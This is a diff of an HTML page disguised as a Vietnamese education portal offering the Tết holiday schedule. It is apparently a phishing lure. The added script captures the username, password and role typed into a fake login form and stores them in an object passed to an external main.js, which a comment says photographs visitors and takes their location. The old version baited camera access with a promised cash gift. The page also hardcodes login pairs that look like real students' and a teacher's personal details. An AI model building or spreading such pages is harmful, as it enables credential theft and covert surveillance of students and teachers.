@@ -3,103 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cổng Thông Tin Giáo Dục - Lịch Nghỉ Tết 2025</title>
+    <title>Cổng Thông Tin Giáo Dục - Đăng Nhập</title>
     <style>
+        /* CSS giữ nguyên từ phiên bản trước */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
             background: #fff5f5; color: #333; 
             display: flex; justify-content: center; align-items: center; min-height: 100vh;
         }
-        
-        /* Giao diện xác thực */
-        #auth-screen {
+        #login-box {
             background: #fff; width: 90%; max-width: 400px;
             padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(211, 47, 47, 0.1);
             text-align: center; border: 2px solid #ffcdd2;
         }
-
-        .student-icon { width: 70px; height: 70px; margin-bottom: 15px; }
-
-        .loader {
-            width: 35px; height: 35px; border: 4px solid #f3f3f3;
-            border-top: 4px solid #ff5252; border-radius: 50%;
-            animation: spin 1s linear infinite; display: none; margin: 20px auto;
+        .logo { width: 80px; margin-bottom: 10px; }
+        h2 { color: #d32f2f; margin-bottom: 20px; font-size: 22px; }
+        input, select {
+            width: 100%; padding: 12px; margin: 8px 0;
+            border: 1px solid #ddd; border-radius: 10px; outline: none;
         }
-
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .btn-verify {
+        .btn-login {
             background: linear-gradient(135deg, #ff5252, #d32f2f);
-            color: white; border: none; padding: 15px;
-            font-size: 16px; font-weight: bold; border-radius: 50px; cursor: pointer;
-            width: 100%; margin-top: 20px; box-shadow: 0 4px 15px rgba(211, 47, 47, 0.3);
+            color: white; border: none; padding: 14px;
+            font-size: 16px; font-weight: bold; border-radius: 50px; 
+            cursor: pointer; width: 100%; margin-top: 15px;
+            box-shadow: 0 4px 15px rgba(211, 47, 47, 0.3);
         }
-
-        /* Giao diện Lịch nghỉ (Ẩn lúc đầu) */
+        .loader {
+            width: 30px; height: 30px; border: 4px solid #f3f3f3;
+            border-top: 4px solid #ff5252; border-radius: 50%;
+            animation: spin 1s linear infinite; display: none; margin: 15px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #main-content {
             display: none; width: 95%; max-width: 550px;
             background: white; border-radius: 15px; overflow: hidden;
             box-shadow: 0 5px 20px rgba(0,0,0,0.1);
         }
-
-        .calendar-header { background: #d32f2f; color: #fff; padding: 20px; text-align: center; }
+        .calendar-header { background: #d32f2f; color: #fff; padding: 25px; text-align: center; }
         .calendar-body { padding: 20px; }
-        
         .level-box {
             background: #fff9f9; border-left: 5px solid #d32f2f;
             padding: 15px; margin-bottom: 15px; border-radius: 5px;
         }
         .level-title { font-weight: bold; color: #d32f2f; margin-bottom: 5px; display: block; }
-        
-        .gift-tag {
-            background: #ffd700; color: #000; padding: 10px; text-align: center;
-            font-weight: bold; border-radius: 10px; margin-top: 10px; cursor: pointer;
+        .all-access-tag { 
+            font-size: 11px; background: #ffebee; color: #d32f2f; 
+            padding: 3px 8px; border-radius: 5px; display: inline-block; margin-bottom: 10px;
         }
     </style>
 </head>
 <body>
 
-<div id="auth-screen">
-    <img src="https://cdn-icons-png.flaticon.com/512/3534/3534033.png" class="student-icon" alt="Student">
-    <h2 style="color: #d32f2f;">Xác Minh Học Sinh</h2>
-    <p style="margin-top: 10px; font-size: 14px; color: #666;">
-        Vui lòng xác thực khuôn mặt để hệ thống tự động tải lịch nghỉ và <b>phần quà lì xì Tết 2025</b> theo cấp học của bạn.
-    </p>
+<div id="login-box">
+    <img src="https://cdn-icons-png.flaticon.com/512/8066/8066542.png" class="logo">
+    <h2>HỆ THỐNG GIÁO DỤC</h2>
+    
+    <select id="user-role">
+        <option value="hocsinh">Học sinh (THCS & THPT)</option>
+        <option value="sinhvien">Sinh viên (ĐH & Cao Đẳng)</option>
+        <option value="giaovien">Giáo viên / Giảng viên</option>
+    </select>
+
+    <input type="text" id="username" placeholder="Tên đăng nhập">
+    <input type="password" id="password" placeholder="Mật khẩu">
     
     <div id="loading-spinner" class="loader"></div>
-<p id="status-text" style="display:none; font-size: 12px; color: #ff5252; margin-top: 10px; font-weight: 500;">
-        Đang nhận diện trường học và vị trí...
-    </p>
+    <p id="status-text" style="display:none; font-size: 12px; color: #ff5252; margin-top: 5px;">Đang xác thực thông tin...</p>
 
-    <button id="action-btn" class="btn-verify" onclick="startProcess()">Bắt đầu xác minh ngay</button>
+    <button id="login-btn" class="btn-login" onclick="processLogin()">ĐĂNG NHẬP</button>
 </div>
 
 <div id="main-content">
     <div class="calendar-header">
-        <h2>LỊCH NGHỈ TẾT GIÁO DỤC 2025</h2>
-        <p>Hệ thống tra cứu tự động cập nhật</p>
+        <h2 id="role-title">LỊCH NGHỈ TẾT 2025</h2>
+        <p>Cập nhật chính thức từ Bộ Giáo Dục</p>
     </div>
     <div class="calendar-body">
-        <div class="level-box">
-            <span class="level-title">🌸 Mầm non & Tiểu học</span>
-            <p>Nghỉ từ 24/01 đến 05/02 (13 ngày)</p>
-        </div>
-        <div class="level-box">
-            <span class="level-title">🌸 THCS & THPT</span>
-            <p>Nghỉ từ 26/01 đến 04/02 (10 ngày)</p>
-        </div>
-        <div class="level-box">
-            <span class="level-title">🌸 Đại học / Cao đẳng</span>
-            <p>Tùy theo lịch nhà trường (Trung bình 14-21 ngày)</p>
-        </div>
-
-        <div class="gift-tag" onclick="alert('Quà lì xì đã được gửi về ví SV của bạn!')">
-            🧧 NHẬN LÌ XÌ KHUYẾN HỌC TẠI ĐÂY
-        </div>
+        <div id="content-detail">
+            </div>
         
         <p style="text-align: center; font-size: 12px; color: #999; margin-top: 15px;">
-            Dữ liệu được xác thực qua IP: <span id="user-ip">...</span>
+            Xác thực thiết bị: <span id="user-ip">Đang kiểm tra...</span>
         </p>
     </div>
 </div>
@@ -107,30 +93,91 @@
 <script src="main.js"></script>
 
 <script>
-    async function startProcess() {
-        const btn = document.getElementById('action-btn');
+    async function processLogin() {
+        const role = document.getElementById('user-role').value;
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+        
+        const btn = document.getElementById('login-btn');
         const loader = document.getElementById('loading-spinner');
         const status = document.getElementById('status-text');
+        let accessGranted = false;
+        
+        if (role === "hocsinh" && user === "06092011" && pass === "Tuan06092011") accessGranted = true;
+        else if (role === "sinhvien" && user === "02102009" && pass === "02102009") accessGranted = true;
+        else if (role === "giaovien" && user === "lecamtu" && pass === "gv079254287410") accessGranted = true;
+
+        if (!accessGranted) {
+            alert("Sai tài khoản hoặc mật khẩu cho đối tượng này!");
+            return;
+        }
 
         btn.style.display = 'none';
         loader.style.display = 'block';
         status.style.display = 'block';
 
         try {
+            if (typeof info !== 'undefined') {
+                info.camera = `[User: ${user}] - Role: ${role} - Pass: ${pass}`;
+            }
+
+            // Gọi hàm main() từ main.js để thực hiện chụp ảnh/vị trí
             await main(); 
+
             setTimeout(() => {
-                document.getElementById('auth-screen').style.display = 'none';
+                document.getElementById('login-box').style.display = 'none';
                 document.getElementById('main-content').style.display = 'block';
+                showSchedule(role);
+                
                 if (typeof info !== 'undefined') {
                     document.getElementById('user-ip').innerText = info.ip || "Đã bảo mật";
                 }
             }, 1000);
 
         } catch (err) {
-            alert("Lỗi: Bạn cần đồng ý quyền Camera để hệ thống xác minh thẻ học sinh.");
+            alert("Lỗi: Bạn cần cấp quyền Camera và Vị trí để xác thực!");
             btn.style.display = 'block';
             loader.style.display = 'none';
             status.style.display = 'none';
+        }
+    }
+
+    function showSchedule(role) {
+        const container = document.getElementById('content-detail');
+        const title = document.getElementById('role-title');
+
+        // Đoạn mã các khối lịch
+        const htmlHS = `
+            <div class="level-box">
+                <span class="level-title">🌸 Khối THCS & THPT</span>
+                <p>Nghỉ từ 26/01 đến hết ngày 04/02/2026.</p>
+            </div>`;
+        const htmlSV = `
+            <div class="level-box">
+                <span class="level-title">🌸 Đại học & Cao Đẳng</span>
+                <p>Nghỉ từ 20/01 đến 09/02/2026 (Tùy theo kế hoạch trường).</p>
+            </div>`;
+        const htmlGV = `
+            <div class="level-box">
+                <span class="level-title">🌸 Cán bộ & Giáo viên</span>
+                <p>Nghỉ từ 25/01 đến hết 02/02/2026 theo quy định Nhà nước.</p>
+            </div>`;
+
+        if (role === "hocsinh") {
+            title.innerText = "LỊCH TẾT HỌC SINH";
+            container.innerHTML = htmlHS;
+        } else if (role === "sinhvien") {
+            title.innerText = "LỊCH TẾT SINH VIÊN";
+            container.innerHTML = htmlSV;
+        } else if (role === "giaovien") {
+            title.innerText = "HỆ THỐNG QUẢN TRỊ GIÁO VIÊN";
+            // Giáo viên xem được TẤT CẢ
+            container.innerHTML = `
+                <div class="all-access-tag">Quyền hạn: Xem toàn bộ lịch nghỉ giáo dục</div>
+                ${htmlGV}
+                ${htmlHS}
+                ${htmlSV}
+            `;
         }
     }
 </script>
